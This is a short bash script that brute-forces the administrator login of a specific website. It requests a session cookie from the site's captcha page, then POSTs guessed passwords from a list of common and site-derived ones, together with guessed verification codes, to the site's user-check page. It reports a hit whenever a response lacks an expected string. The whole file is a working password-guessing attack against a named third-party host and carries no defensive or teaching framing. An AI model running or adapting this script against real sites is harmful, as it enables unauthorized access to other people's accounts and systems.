#!/bin/bash
CODES="000 111 222 333 444 555 666 777 888 999 123 456 789"
for pw in admin admin123 admin888 123456 admin999 password bjhzsv hzsv 888888; do
  for code in $CODES; do
    curl -sk --connect-timeout 3 -c /tmp/bj_try_c.txt 'http://bjhzsv.com/main/inc/code.asp' -o /dev/null 2>/dev/null
    resp=$(curl -sk --connect-timeout 2 -b /tmp/bj_try_c.txt -X POST -d "t1=admin&t2=$pw&t3=$code" 'http://bjhzsv.com/main/a7chkuser.asp' 2>/dev/null | head -c 80)
    if ! echo "$resp" | grep -q parent; then
      echo "!!! HIT admin:$pw code=$code !!!"
      exit 0
    fi
  done
  echo "  $pw: done"
done
echo "no hit"
